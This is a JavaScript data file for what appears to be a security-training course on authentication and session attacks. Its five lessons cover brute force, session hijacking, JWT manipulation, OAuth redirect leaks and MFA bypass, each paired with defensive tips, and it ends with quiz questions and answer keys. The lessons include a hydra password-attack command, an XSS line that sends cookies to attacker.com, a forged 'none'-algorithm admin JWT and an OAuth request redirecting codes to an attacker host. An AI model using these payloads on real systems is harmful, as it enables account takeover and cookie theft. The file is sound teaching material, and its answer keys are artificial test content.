export const AUTH_ROOM_DATA = {
  id: "authentication-session-attacks",
  title: "Authentication & Session Attacks",
  category: "Web",
  difficulty: "Advanced",
  duration: "90 min",
  description: "Master the dark side of authentication. From hijacking sessions to manipulating JWT signatures and bypassing MFA, learn the advanced exploits that topple secure systems.",
  totalXP: 250,
  enrollments: 1650,
  rating: 4.9,
  creator: "CyberVerse Team",
  tags: ["auth", "sessions", "jwt", "oauth", "mfa-bypass"],
  tasks: [
    {
      id: 1,
      title: "Broken Authentication",
      subtitle: "The Front Door is Ajar",
      icon: "user-lock",
      difficulty: "Intermediate",
      xp: 50,
      image: "/images/rooms/auth/task1.png",
      scenario: {
        title: "Brute Force Reality",
        text: "A target portal uses standard credentials but lacks account lockout protection. You need to leverage password spraying to gain access.",
        impact: "Initial access is the first step in any APT. Without account lockouts, any user is a target."
      },
      content: [
        { type: "text", value: "Broken Authentication occurs when functions related to authentication and session management are implemented incorrectly, allowing attackers to compromise passwords, keys, or session tokens." },
        { type: "heading", value: "Common Vectors" },
        { type: "list", items: [
          "**Credential Stuffing**: Using lists of leaked credentials from other breaches.",
          "**Brute Force**: Attempting every possible combination until success.",
          "**Weak Hashing**: Systems using MD5 or SHA1 instead of Argon2 or Bcrypt.",
          "**Lack of Salt**: Storing hashes without unique 'salts' allows Rainbow Table attacks."
        ] },
        { type: "terminal", language: "bash", code: `# Simulating a dictionary attack with hydra\nhydra -l admin -P /usr/share/wordlists/passwords.txt 10.10.12.3 http-post-form "/login:user=^USER^&pass=^PASS^:F=Login failed"` },
        { type: "callout", variant: "warning", title: "Defensive Tip", text: "Always implement account lockout and rate limiting (CAPTCHA) on login endpoints." }
      ],
      questions: [
        {
          id: "auth_q1",
          text: "What attack uses a list of username/password pairs leaked from other websites?",
          answer: "Credential Stuffing",
          acceptableAnswers: ["Credential Stuffing", "credential stuffing"],
          hint: "Think 'Stuffing' existing credentials."
        }
      ]
    },
    {
      id: 2,
      title: "Session Hijacking & Fixation",
      subtitle: "Stealing the Identity Token",
      icon: "cookie",
      difficulty: "Advanced",
      xp: 50,
      image: "/images/rooms/auth/task2.png",
      scenario: {
        title: "Intercepting the Cookie",
        text: "The web app sends session IDs over HTTP. An attacker on the same network is sniffing traffic and catches a 'sessionid' cookie belonging to an admin.",
        impact: "Session hijacking allows complete account takeover without ever knowing the user's password."
      },
      content: [
        { type: "text", value: "A **Session ID** is like a temporary passport. If an attacker gets it, they can 'be' you." },
        { type: "heading", value: "Attack Methodologies" },
        { type: "comparison", 
          left: { title: "Hijacking (Theft)", color: "#9333ea", items: ["XSS to steal cookies", "Packet sniffing (non-HTTPS)", "Session ID prediction"] }, 
          right: { title: "Fixation (Supply)", color: "#f59e0b", items: ["Supplying an SID to victim", "Wait for victim to login", "Attacker uses pre-set SID"] } 
        },
        { type: "terminal", language: "javascript", code: `// Malicious XSS payload to steal cookies\nfetch('https://attacker.com/log?c=' + document.cookie);` },
        { type: "callout", variant: "info", title: "Cookie Security", text: "Set 'HttpOnly' (prevents XSS theft) and 'Secure' (ensures HTTPS only) flags on your cookies." }
      ],
      questions: [
        {
          id: "auth_q2",
          text: "Which cookie flag prevents client-side JavaScript from accessing the cookie?",
          answer: "HttpOnly",
          acceptableAnswers: ["HttpOnly", "httponly"],
          hint: "It limits access to the HTTP protocol only."
        }
      ]
    },
    {
      id: 3,
      title: "JWT Token Manipulation",
      subtitle: "Cracking the JSON Safe",
      icon: "key",
      difficulty: "Advanced",
      xp: 50,
      image: "/images/rooms/auth/task3.png",
      scenario: {
        title: "The 'None' Algorithm",
        text: "You find a JWT in your local storage. It has 'alg': 'HS256'. If you change it to 'none' and remove the signature, will the server still trust you?",
        impact: "Improper JWT verification can allow role escalation from 'user' to 'admin'."
      },
      content: [
        { type: "text", value: "JWTs consist of three parts: **Header**, **Payload**, and **Signature**. They are Base64Url encoded, not encrypted!" },
        { type: "heading", value: "JWT Attack Vectors" },
        { type: "list", items: [
          "**Algorithm Swapping**: Changing RS256 (public key) to HS256 (symmetric) to trick the server.",
          "**Weak Secret**: Brute forcing the HMAC secret if it's too simple.",
          "**None Algorithm**: The classic exploit where the server accepts an unsigned 'none' algo.",
          "**KID Injection**: Pointing the Key ID to a local file (Path Traversal) or external URL (SSRF)."
        ] },
        { type: "terminal", language: "text", code: `Header:  {"alg":"none","typ":"JWT"}\nPayload: {"user":"admin","iat":16161616}\nSignature: [Empty]` },
        { type: "callout", variant: "danger", title: "Warning", text: "Never trust a JWT without verifying its signature against a strict allowed-algorithm list." }
      ],
      questions: [
        {
          id: "auth_q3",
          text: "What are the three parts of a JWT separated by dots?",
          answer: "Header, Payload, Signature",
          acceptableAnswers: ["Header, Payload, Signature", "header payload signature"],
          hint: "H___, P___, S___"
        }
      ]
    },
    {
      id: 4,
      title: "OAuth 2.0 & Redirect Vulnerabilities",
      subtitle: "The Trust Chain Breach",
      icon: "repeat",
      difficulty: "Advanced",
      xp: 50,
      image: "/images/rooms/auth/task4.png",
      scenario: {
        title: "Leaking the Auth Code",
        text: "An application allows any 'redirect_uri' subdomain. You craft a link that sends the user's secret authorization code to your malicious server.",
        impact: "OAuth flaws can lead to account hijacking through third-party integrations (Login with Google/Facebook)."
      },
      content: [
        { type: "text", value: "OAuth 2.0 is an authorization framework that allows applications to access user data without knowing the password." },
        { type: "heading", value: "The Redirect Leak" },
        { type: "list", items: [
          "**Open Redirectors**: Using the application as a jump-off point to an attacker site.",
          "**State Parameter Lack**: Omitting the 'state' parameter leads to CSRF in the auth flow.",
          "**Token Leakage**: Fragments like #access_token being leaked via Referer headers."
        ] },
        { type: "terminal", language: "text", code: `GET /auth?client_id=123&redirect_uri=https://attacker.com/callback&response_type=code` },
        { type: "callout", variant: "info", title: "Defense", text: "Always use strict whitelisting for redirect URLs and valid 'state' tokens to prevent CSRF." }
      ],
      questions: [
        {
          id: "auth_q4",
          text: "Which parameter is used in OAuth to prevent Cross-Site Request Forgery (CSRF)?",
          answer: "state",
          acceptableAnswers: ["state", "state parameter"],
          hint: "A random unique string sent in the request."
        }
      ]
    },
    {
      id: 5,
      title: "MFA Bypass Techniques",
      subtitle: "The Final Defense",
      icon: "shield-check",
      difficulty: "Advanced",
      xp: 50,
      image: "/images/rooms/auth/task5.png",
      scenario: {
        title: "The Push Fatigue",
        text: "The target has Multi-Factor Authentication (MFA). You spam their phone with 100 push notifications at 3 AM until they click 'Approve' just to make it stop.",
        impact: "Even strong MFA can be defeated by social engineering, fatigue, or technical flaws."
      },
      content: [
        { type: "text", value: "MFA adds 'something you have' or 'something you are' to 'something you know'." },
        { type: "heading", value: "Bypass Methods" },
        { type: "comparison", 
          left: { title: "Technical Flaws", color: "#FF3366", items: ["Null-byte injection in SMS code", "Brute forcing 4-digit codes", "Leaking codes in logs"] }, 
          right: { title: "Human/Logic Flaws", color: "#00FFCC", items: ["MFA Push Fatigue", "SIM Swapping", "Support Desk Bypass (Social Engineering)"] } 
        },
        { type: "terminal", language: "bash", code: `# Attacker logs showing code interception\n[Intercepted] SMS to +1234567: Your code is 8842` },
        { type: "callout", variant: "tip", title: "Best Practice", text: "Use hardware keys (FIDO2) or TOTP apps instead of insecure SMS-based 2FA." }
      ],
      questions: [
        {
          id: "auth_q5",
          text: "Which 2FA method is most vulnerable to SIM Swapping attacks?",
          answer: "SMS",
          acceptableAnswers: ["SMS", "sms", "text message"],
          hint: "Short Message Service."
        }
      ]
    }
  ]
};

export const AUTH_QUIZ = [
  {
    id: "auth_fq1",
    question: "Which JWT algorithm value is often misused by attackers to bypass signature verification?",
    options: ["HS256", "RS256", "none", "ES256"],
    correctAnswer: "none",
    explanation: "If a server accepts the 'none' algorithm, it will skip signature verification entirely."
  },
  {
    id: "auth_fq2",
    question: "What is the primary risk of using HTTP instead of HTTPS for session management?",
    options: ["Poor Performance", "Session Hijacking (Sniffing)", "Slow Load Times", "Broken Links"],
    correctAnswer: "Session Hijacking (Sniffing)",
    explanation: "HTTP sends data in plain text, allowing anyone on the network to 'sniff' and steal session IDs."
  },
  {
    id: "auth_fq3",
    question: "In OAuth 2.0, what does the 'redirect_uri' determine?",
    options: ["Where the login page is hosted", "Where the authorization code is sent after login", "The user's home page", "The password reset page"],
    correctAnswer: "Where the authorization code is sent after login",
    explanation: "The redirect_uri tells the Auth server where to send the user back with their credentials."
  },
  {
    id: "auth_fq4",
    question: "Which of these is an example of 'MFA Push Fatigue'?",
    options: ["Phone battery dying", "Spamming prompts until user clicks 'Accept'", "Forgetting your phone", "Slow internet connection"],
    correctAnswer: "Spamming prompts until user clicks 'Accept'",
    explanation: "Push fatigue leverages human psychology to trick users into approving unauthorized logins."
  },
  {
    id: "auth_fq5",
    question: "What is 'Session Fixation'?",
    options: ["Fixing a broken session", "An attacker supplying a session ID to a victim", "Changing the password", "Clearing browser cookies"],
    correctAnswer: "An attacker supplying a session ID to a victim",
    explanation: "In fixation, the attacker sets the session ID for the user before they log in."
  }
];
